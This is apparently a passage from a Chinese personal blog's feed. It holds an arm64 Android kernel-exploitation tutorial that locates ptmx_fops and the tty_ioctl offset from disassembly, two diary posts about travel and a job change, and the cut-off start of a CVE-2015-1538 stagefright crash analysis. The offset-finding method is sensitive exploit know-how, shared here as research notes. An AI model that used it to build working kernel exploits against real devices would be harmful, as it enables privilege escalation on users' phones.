class="number">0xffffffc000c1e000</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ed8</span>:     add     x0, x0, <span class="preprocessor">#<span class="number">0x7c0</span></span></span><br><span class="line"><span class="number">0xffffffc000d78edc</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc0009a799c</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ee0</span>:     ldr     w0, [x20, <span class="preprocessor">#<span class="number">0xef0</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78ee4</span>:     movz    x1, <span class="preprocessor">#<span class="number">0</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ee8</span>:     movz    x2, <span class="preprocessor">#<span class="number">0x46</span></span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>pty_init函数比较长，纯看汇编很难定位到<code>tty_default_fops(&amp;ptmx_fops)</code>这个地方，一种方法是找到32位的kernel反汇编对照着看，因为32位可以用ida的F5，但是依然麻烦。</p>
<p>这里注意到tty_default_fops这个函数在内核符号表中是有导出的，地址为<code>0xffffffc0003431b4</code>，现在重新看反汇编，直接查找这个值，定位附近的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffc000d79174</span>:     add     x0, x0, <span class="preprocessor">#<span class="number">0x8f8</span></span></span><br><span class="line"><span class="number">0xffffffc000d79178</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc0009a799c</span></span></span><br><span class="line"><span class="number">0xffffffc000d7917c</span>:     add     x19, x20, <span class="preprocessor">#<span class="number">0x10</span></span></span><br><span class="line"><span class="number">0xffffffc000d79180</span>:     add     x20, x20, <span class="preprocessor">#<span class="number">0xe8</span></span></span><br><span class="line"><span class="number">0xffffffc000d79184</span>:     mov     x0, x19</span><br><span class="line"><span class="number">0xffffffc000d79188</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc0003431b4</span></span></span><br><span class="line"><span class="number">0xffffffc000d7918c</span>:     adrp    x2, <span class="preprocessor">#<span class="number">0xffffffc00034a000</span></span></span><br></pre></td></tr></table></figure>
<p>这里第一个参数x0即为ptmx_fops值。<br>x0 = x19 = x20 + 0x10<br>往上看x20赋值的地方。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffc000d79010</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc0009a799c</span></span></span><br><span class="line"><span class="number">0xffffffc000d79014</span>:     adrp    x21, <span class="preprocessor">#<span class="number">0xffffffc000f36000</span></span></span><br><span class="line"><span class="number">0xffffffc000d79018</span>:     movz    w0, <span class="preprocessor">#<span class="number">0x10</span>, lsl #<span class="number">16</span></span></span><br><span class="line"><span class="number">0xffffffc000d7901c</span>:     movz    x1, <span class="preprocessor">#<span class="number">0</span></span></span><br><span class="line"><span class="number">0xffffffc000d79020</span>:     movz    x2, <span class="preprocessor">#<span class="number">0x5e</span></span></span><br><span class="line"><span class="number">0xffffffc000d79024</span>:     add     x20, x21, <span class="preprocessor">#<span class="number">0xd80</span></span></span><br><span class="line"><span class="number">0xffffffc000d79028</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc0003413d0</span></span></span><br></pre></td></tr></table></figure>
<p>x20 = x21 + 0xd80 = 0xffffffc000f36000 + 0xd80<br>得出<br>ptmx_fops = 0xffffffc000f36000 + 0xd80 + 0x10</p>
<h2 id="计算函数偏移">计算函数偏移</h2><p>接上边，在path ioctl过程中，如何找到ptmx对应的<code>tty_ioctl</code>，这个syscall调用流程为：<br>sys_ioctl -&gt; do_vfs_ioctl -&gt; tty_ioctl<br>部分源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_vfs_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">if</span> (S_ISREG(inode-&gt;i_mode))</span><br><span class="line">            error = file_ioctl(filp, cmd, arg);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            error = vfs_ioctl(filp, cmd, arg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">vfs_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span><br><span class="line">              <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> error = -ENOTTY;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!filp-&gt;f_op || !filp-&gt;f_op-&gt;unlocked_ioctl)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);</span><br><span class="line">    <span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">        error = -ENOTTY;</span><br><span class="line"> out:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后调用<code>filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg)</code></p>
<p>所以确定tty_ioctl的偏移即可以从相应的反汇编的寄存器传值看出，当然也可以直接从定义的tty_fops结构中算出，但是如果是复杂的结构体呢。</p>
<p>通过内核符号表找到do_vfs_ioctl的地址为<code>0xffffffc0001a4ca4</code>,反汇编代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffc0001a4ca4</span>: stp x29, x30, [sp, <span class="preprocessor">#-<span class="number">0x90</span>]!</span></span><br><span class="line"><span class="number">0xffffffc0001a4ca8</span>: movz    w4, <span class="preprocessor">#<span class="number">0x5452</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4cac</span>: mov x29, sp</span><br><span class="line"><span class="number">0xffffffc0001a4cb0</span>: stp x19, x20, [sp, <span class="preprocessor">#<span class="number">0x10</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4cb4</span>: stp x21, x22, [sp, <span class="preprocessor">#<span class="number">0x20</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4cb8</span>: str x23, [sp, <span class="preprocessor">#<span class="number">0x30</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4cbc</span>: cmp w2, w4</span><br><span class="line"><span class="number">0xffffffc0001a4cc0</span>: mov x19, x0</span><br><span class="line"><span class="number">0xffffffc0001a4cc4</span>: mov x20, x3</span><br><span class="line"><span class="number">0xffffffc0001a4cc8</span>: ldr x21, [x0, <span class="preprocessor">#<span class="number">0x20</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4ccc</span>: b.eq    <span class="preprocessor">#<span class="number">0xffffffc0001a5068</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4cd0</span>: b.ls    <span class="preprocessor">#<span class="number">0xffffffc0001a4e4c</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4cd4</span>: movz    w0, <span class="preprocessor">#<span class="number">0x5877</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4cd8</span>: movk    w0, <span class="preprocessor">#<span class="number">0xc004</span>, lsl #<span class="number">16</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4cdc</span>: cmp w2, w0</span><br><span class="line"><span class="number">0xffffffc0001a4ce0</span>: b.eq    <span class="preprocessor">#<span class="number">0xffffffc0001a4fa0</span></span></span><br><span class="line">...</span><br><span class="line"><span class="number">0xffffffc0001a4fa0</span>: movz    w0, <span class="preprocessor">#<span class="number">0x15</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fa4</span>: ldr x19, [x21, <span class="preprocessor">#<span class="number">0x28</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fa8</span>: bl  <span class="preprocessor">#<span class="number">0xffffffc0000a7294</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fac</span>: uxtb    w0, w0</span><br><span class="line"><span class="number">0xffffffc0001a4fb0</span>: cbz w0, <span class="preprocessor">#<span class="number">0xffffffc0001a51a0</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fb4</span>: ldr x0, [x19, <span class="preprocessor">#<span class="number">0x30</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fb8</span>: ldr x0, [x0, <span class="preprocessor">#<span class="number">0x40</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fbc</span>: cbz x0, <span class="preprocessor">#<span class="number">0xffffffc0001a5218</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fc0</span>: mov x0, x19</span><br><span class="line"><span class="number">0xffffffc0001a4fc4</span>: bl  <span class="preprocessor">#<span class="number">0xffffffc000197d18</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fc8</span>: b   <span class="preprocessor">#<span class="number">0xffffffc0001a4e84</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fcc</span>: ldrh    w0, [x21]</span><br><span class="line"><span class="number">0xffffffc0001a4fd0</span>: and w0, w0, <span class="preprocessor">#<span class="number">0xf000</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fd4</span>: cmp w0, <span class="preprocessor">#<span class="number">8</span>, lsl #<span class="number">12</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fd8</span>: b.eq    <span class="preprocessor">#<span class="number">0xffffffc0001a5100</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fdc</span>: ldr x0, [x19, <span class="preprocessor">#<span class="number">0x28</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fe0</span>: cbz x0, <span class="preprocessor">#<span class="number">0xffffffc0001a5004</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fe4</span>: ldr x3, [x0, <span class="preprocessor">#<span class="number">0x40</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fe8</span>: cbz x3, <span class="preprocessor">#<span class="number">0xffffffc0001a5004</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fec</span>: mov w1, w2</span><br><span class="line"><span class="number">0xffffffc0001a4ff0</span>: mov x0, x19</span><br><span class="line"><span class="number">0xffffffc0001a4ff4</span>: mov x2, x20</span><br><span class="line"><span class="number">0xffffffc0001a4ff8</span>: blr x3</span><br><span class="line"><span class="number">0xffffffc0001a4ffc</span>: cmn w0, <span class="preprocessor">#<span class="number">0x203</span></span></span><br><span class="line"><span class="number">0xffffffc0001a5000</span>: b.ne    <span class="preprocessor">#<span class="number">0xffffffc0001a4e84</span></span></span><br><span class="line"><span class="number">0xffffffc0001a5004</span>: movn    w0, <span class="preprocessor">#<span class="number">0x18</span></span></span><br><span class="line"><span class="number">0xffffffc0001a5008</span>: b   <span class="preprocessor">#<span class="number">0xffffffc0001a4e84</span></span></span><br><span class="line"><span class="number">0xffffffc0001a500c</span>: mov x0, sp</span><br><span class="line"><span class="number">0xffffffc0001a5010</span>: and x1, x0, <span class="preprocessor">#<span class="number">0xffffffffffffc000</span></span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>代码比较长，直接看是看不出来的，查看源码中函数调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">    error = -ENOTTY;</span><br></pre></td></tr></table></figure>
<p>返回值会与<code>ENOIOCTLCMD</code>做比较，查找源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define ENOIOCTLCMD    515    /&#65290; No ioctl command &#65290;/</span><br></pre></td></tr></table></figure>
<p>返回值在w0或x0中，直接在反汇编中搜特征值515对应的16进制0x203，如果结果过多，可以通过查看前后调用相关寄存器操作等其他特征进一步确定，这里就找到一处，定位到调用代码片段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffc0001a4fdc</span>: ldr x0, [x19, <span class="preprocessor">#<span class="number">0x28</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fe0</span>: cbz x0, <span class="preprocessor">#<span class="number">0xffffffc0001a5004</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fe4</span>: ldr x3, [x0, <span class="preprocessor">#<span class="number">0x40</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4fe8</span>: cbz x3, <span class="preprocessor">#<span class="number">0xffffffc0001a5004</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4fec</span>: mov w1, w2</span><br><span class="line"><span class="number">0xffffffc0001a4ff0</span>: mov x0, x19</span><br><span class="line"><span class="number">0xffffffc0001a4ff4</span>: mov x2, x20</span><br><span class="line"><span class="number">0xffffffc0001a4ff8</span>: blr x3</span><br><span class="line"><span class="number">0xffffffc0001a4ffc</span>: cmn w0, <span class="preprocessor">#<span class="number">0x203</span></span></span><br></pre></td></tr></table></figure>
<p>所以x0为f_op指针，其偏移0x40即为tty_ioctl地址。</p>
<h2 id="总结">总结</h2><ol>
<li>内核漏洞利用过程中，不管是path哪些地址，最好的方法就是直接找到该地方调用处，然后根据编译好的kernel文件去定位。</li>
<li>同样在找结构体偏移值时，通过调用地方查看寄存器传参来确定偏移值，如果通过源码计算不仅麻烦还容易算错。</li>
<li>多读源码涨姿势。</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>主要针对arm64，现在ida6.8并不支持arm64的反汇编，所以在定位代码过程中会很麻烦，而32位是直接可以f5对照源码看的。</p>
<h2 id="获取内核符号表">获取内核符号表</h2><p>先放一个内核符号表的部分样子：</p>
<pre><code>ffff]]>
    </summary>
    
      <category term="kernel" scheme="http://blog.idhyt.com/tags/kernel/"/>
    
      <category term="symbol" scheme="http://blog.idhyt.com/tags/symbol/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一场说走就走的旅行]]></title>
    <link href="http://blog.idhyt.com/2016/05/02/diary-stay-away-trip/"/>
    <id>http://blog.idhyt.com/2016/05/02/diary-stay-away-trip/</id>
    <published>2016-05-02T15:21:01.000Z</published>
    <updated>2016-05-25T16:16:35.000Z</updated>
    <content type="html"><![CDATA[<blockquote class="blockquote-center">人生至少要有两次冲动，一为奋不顾身的爱情，一为说走就走的旅行。</blockquote>

<a id="more"></a>
<p>当然，这话不是我说的。<br>每次出去都要计划好路线和攻略，希望整个旅行都在自己控制的时间段内完成，事实也确实如此。<br>这一次，没有计划，没有攻略，没有目的，没有时间点，一个人，说走就走。</p>
<iframe src="https://www.google.com/maps/d/embed?mid=1ofAIHkM96BbJVMvnmqD4DrUNid4" width="640" height="480"></iframe>

<p>上面是我大概去过的地方(google map如果看不到你懂得，参见第一张图)，原来每次出去玩都是奔着景点，造成的结果就是长途跋涉，身心疲惫。<br>后来跟着摄影爱好者加被帐篷爬各种野山的人出去几次后，看了很多美景。<br>像这样：<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-01.jpg" alt="diary-stay-away-trip-01"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-06.jpg" alt="diary-stay-away-trip-06"></p>
<p>这样：<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-02.jpg" alt="diary-stay-away-trip-02"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-03.jpg" alt="diary-stay-away-trip-03"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-04.jpg" alt="diary-stay-away-trip-04"></p>
<p>当然，还有这样：<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-05.jpg" alt="diary-stay-away-trip-05"></p>
<p>看多了大自然的野山野水，觉得每个地方的景点也就平平无奇。现在出去旅行的心态就是为了放松，到每个城市，不刻意去景点，想象自己就在这座城市生活工作，让自己融入其中，感受下当地人民的生活，走走吃吃停停，放空自己。</p>
<p>出发之前先去广州找了几个基友玩了一天，打了一晚上迷一样的桌球，少一点真诚，多一点套路。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-20.jpg" alt="diary-stay-away-trip-20"></p>
<p>然后去了长沙，到长沙第一天为了放慢节奏先去电影院看了场电影，然后在附近瞎走走晚上出去吃了路边摊。<br>第二天去了湖大，环境不错，就在学校呆了一天，可惜自习室不给进。<br>第三天去了步行街，晚上吃了小龙虾，下午还突然来一场暴雨，吓到我赶紧掏出电脑了一行代码压压惊。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-07.jpg" alt="diary-stay-away-trip-07"></p>
<p>北上去了武汉，去武大看樱花，嗯，樱花真漂亮～<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-08.jpg?imageMogr2/rotate/90" alt="diary-stay-away-trip-08"></p>
<p>然而实际上，连花瓣都没了，晚来了几天，只有这个纪念品了，真是个悲伤的故事。<br>继续北上回家呆了一周，然后决定去苏州，发现真是做了一个机智的决定。</p>
<p>苏州这座城市太神奇了，一来便爱上，这里仿佛就是一个古老的城镇，随处可见的小桥流水。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-22.jpg?imageMogr2/rotate/90" alt="diary-stay-away-trip-22"></p>
<p>但是城镇中竟然有所有你想的到的现代化工具公交地铁商场，每天出门瞎晃悠总有一种穿越的感觉。<br>我在想，每天晒晒太阳喝喝茶，没事出去晃一晃的苏州人民，幸福指数会爆表嘛？<br>第一天去了苏州大学，很有感觉，古色古香充满浓重的文学气息，在这样的学校读书，幸福指数会爆表吗？<br>第二天早上去了拙政园看园林，网上买好票，机智的我在门口等了一个带团的导游，然后就屁颠屁颠的跟着后边听讲解，然后自己有慢慢悠悠晃了一圈。虽然不是旺季也不是节假日，但人依然很多，各种各样的花也开的差不多了，还是很漂亮。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-09.jpg" alt="diary-stay-away-trip-09"></p>
<p>其实早上打算先去苏州博物馆的，因为和拙政园挨着，但是我睡醒到那边都10点半了，不知道和周一闭馆有没有原因，排队的人超级超级超级超级多，然后就先去拙政园了，然后1点出来发现竟然就10来个人在排队了，所以很轻松的进去了。我也没什么鉴赏文艺的细胞，所以就在里边瞎看看，不过博物馆还是挺漂亮的。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-10.jpg" alt="diary-stay-away-trip-10"></p>
<p>在桃花坞那里的青旅住了一周多，每天就是睡到自然醒，然后出去觅食，不知不觉就逛了很多地方，观前街，七里山塘，平江历史街区，还有不知名的地方。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-11.jpg?imageMogr2/rotate/90" alt="diary-stay-away-trip-11"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-12.jpg" alt="diary-stay-away-trip-12"></p>
<p>晚上回来在一楼的小酒吧坐着听看那个帅小哥弹琴，还会逗一逗睡觉的猫咪。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-13.jpg" alt="diary-stay-away-trip-13"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-14.jpg" alt="diary-stay-away-trip-14"></p>
<p>住青旅最好的一点就是会认识很多旅途中的人，认识了一个刚工作半年就裸体出来旅行的码农，处于迷茫期，跟他聊了很多，还挺有意思。还有三个大学生出来创业，各种有意思的事情，想想自己大学的时候，还在宿舍默默的打游戏，自愧不如啊。这家青旅还是挺有感觉，墙上贴面了火车票和明信片，还有留言本，晚上没事翻了翻，里边很多驴友有意思的旅行纪录，从哪里来，为何要来这里，下一站又要去哪里，旅行的意义大概如此吧。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-15.jpg" alt="diary-stay-away-trip-15"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-16.jpg" alt="diary-stay-away-trip-16"></p>
<p>由于其他原因，时间不能继续放空，最后去了杭州，其实最开始目标就是这里啦。<br>或许对杭州的期待过高，又或许是因为苏州太合我的胃口，总觉得杭州并没有想象中的那么吸引我。<br>好像当初去云南一样，其实对丽江和洱海期望最高，但是也是先去了泸沽湖，然后到洱海后发现，还是泸沽湖最漂亮。<br>所以，想象中期待的并不一定是最好的，最好的可能就出现在途中，给自己多一些选择不是坏事。<br>在杭州呆了将近四天，基本步行绕西湖一圈，那两天一直毛毛细雨，还是挺有感觉的。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-17.jpg" alt="diary-stay-away-trip-17"></p>
<p>雷峰塔，灵隐寺，还去浙大留学生餐厅吃了几顿饭，真的好便宜，味道还ok。<br>还有朋友极力推荐的云栖竹径，有点远，不过公交车还挺方便，出来的时候还碰到了一只小松鼠。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-18.jpg" alt="diary-stay-away-trip-18"><br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-19.jpg" alt="diary-stay-away-trip-19"></p>
<p>杭州过后就回去了，其实很想在苏杭一代多住几天，还想着去厦门和南京，毕竟已经在外边快一个月了，该滚回去搬砖了。<br><img src="http://o7keinrz4.bkt.clouddn.com/diary-stay-away-trip-21.jpg" alt="diary-stay-away-trip-21"></p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote class="blockquote-center">人生至少要有两次冲动，一为奋不顾身的爱情，一为说走就走的旅行。</blockquote>]]>
    
    </summary>
    
      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一定要更加努力]]></title>
    <link href="http://blog.idhyt.com/2016/04/06/diary-work-harder/"/>
    <id>http://blog.idhyt.com/2016/04/06/diary-work-harder/</id>
    <published>2016-04-05T17:38:11.000Z</published>
    <updated>2016-05-25T16:28:48.000Z</updated>
    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;下山了，真的下山了，感谢陪伴我的小伙伴和充满基友的团队以及带过我的老大们还有智慧与美貌并存的神仙姐姐们，特别要感谢美丽的珠海，这个来了不想走的城市，真的离开了，却不知道如何道别。</p>
<a id="more"></a>
<hr>

<p>&#160; &#160; &#160; &#160;刚毕业的学生大多是感性的，第一份工作都是存在很多感情吧，对这里的小伙伴有感情，对公司有感情，所以总是满怀期待的希望能够与公司共同成长，从金山网络到上市成为猎豹移动，公司的成长真的很快，可是我确停滞了，当我明确知道自己需要时间沉淀的时候，发现已经不能适应这里的环境了。算上实习差不多刚好两年，都说第一份工作最好做够三年，对于互联网这种企业文化， 可能三年真的是太久了，我等不了，怕再等下去真的要迷失在这个温柔的城市。工作的第一年总感觉自己是在滚雪球，体型是大了，可里边是空的，我一直迷失在这种自我感觉良好的状态之中，按时工作按时完成任务，晚上回家看了很多新鲜的事物，觉得很多东西都很好玩，错误的认为从对一个东西的不知到知是一个快速成长的过程。病毒，web漏洞，前端，各种编程语言还有一些奇奇怪怪的东西，仿佛看到了一片森林，然后迷失了方向，又回到大学毕业时候的状态，什么都会，确又什么都不会。做事情总是徘徊在第一步，第二步，第三步没有了，遇到问题停滞了。</p>
<hr>

<p>&#160; &#160; &#160; &#160;身边确实有一些人是从开始就明确知道自己想要什么，该做什么，可我却和大部分人一样要经历很久的迷茫期，高三，大四都是如此，或许每个人都会在特定的时间点会想明白一些事情，当我真正的正视了自己存在的问题，曾经工作中得过且过的状态全都被放大化，细细想一想一年多了，自己的成长在哪里。一起来的小伙伴都已经离去大半，有的去创业，有的去更好的公司，那段时间我也特别浮躁，可是我连以后的方向和想做什么都还想不好，我怎能说服自己以后会好的。真的有太多美好的事情都这样不知不觉随着时间消逝，而自己一边贪婪享受着安逸的现状的同时确又在不断抱怨没有思考和创造力的生活。</p>
<hr>

<p>&#160; &#160; &#160; &#160;既然想清楚了，那就是该告别的时候了，越长大越开始觉得大人说的话确实有道理，可惜全都是自己经历过后才真的明白，弯路半米都少走不了，我现在能力所能看到想到的就只有这些，过简单的生活，做简单的事情，不为我从哪里来，我又要到哪里去这些大道理所困扰，做自己认为对的事情，这样挺好不是？不能再感性的留恋这里，这样的状态，不曾想过自己能成长到哪里，如果再不咬牙努力，可能就真看不到努力后的自己。</p>
<hr>

<p>&#160; &#160; &#160; &#160;离职办完，坐在卡位上看着空荡荡的桌子，真的特别蒙逼，仿佛追了一个妹子两年没追到又爱又恨，又仿佛做了一场关于成长的梦，可是这一切都在这个时间点结束了。怀念那夕阳下奔跑的金山网络，君子之交淡如水，离别是为了更好的重逢，一定要更加努力，共勉！</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160; &#160; &#160; &#160;下山了，真的下山了，感谢陪伴我的小伙伴和充满基友的团队以及带过我的老大们还有智慧与美貌并存的神仙姐姐们，特别要感谢美丽的珠海，这个来了不想走的城市，真的离开了，却不知道如何道别。</p>]]>
    
    </summary>
    
      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2015-1538 libstagefright漏洞分析]]></title>
    <link href="http://blog.idhyt.com/2016/03/13/exploit-cve-2015-1538/"/>
    <id>http://blog.idhyt.com/2016/03/13/exploit-cve-2015-1538/</id>
    <published>2016-03-13T13:49:11.000Z</published>
    <updated>2016-03-31T09:16:38.000Z</updated>
    <content type="html"><![CDATA[<h2 id="漏洞分析">漏洞分析</h2><p>POC直接使用<a href="https://github.com/jduck/cve-2015-1538-1" target="_blank" rel="external">https://github.com/jduck/cve-2015-1538-1</a>生成的mp4文件，作者说明了这个exp并不通用，我的测试机为nexus-5-android-4.4，只能造成崩溃。<br>崩溃信息：</p>
<pre><code><span class="number">03-13 13:19</span>:<span class="number">33.130 14267</span> 14267 I DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
<span class="number">03-13 13:19</span>:<span class="number">33.130 14267</span> 14267 I DEBUG   : Build fingerprint: 'google/hammerhead/hammerhead:4.4.4/KTU84P/<span class="number">1227136</span>:user/release-keys'
<span class="number">03-13 13:19</span>:<span class="number">33.130 14267</span> 14267 I DEBUG   : Revision: '11'
<span class="number">03-13 13:19</span>:<span class="number">33.130 14267</span> 14267 I DEBUG   : pid: 17874, tid: 17928, name: Binder_1  &gt;&gt;&gt; /system/bin/mediaserver &lt;&lt;&lt;
<span class="number">03-13 13:19</span>:<span class="number">33.130 14267</span> 14267 I DEBUG   : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr <span class="number">41d00010</span>
<span class="number">03-13 13:19</span>:<span class="number">33.140 15745</span> 15836 W NativeCrashListener: Couldn't find ProcessRecord for pid 17874
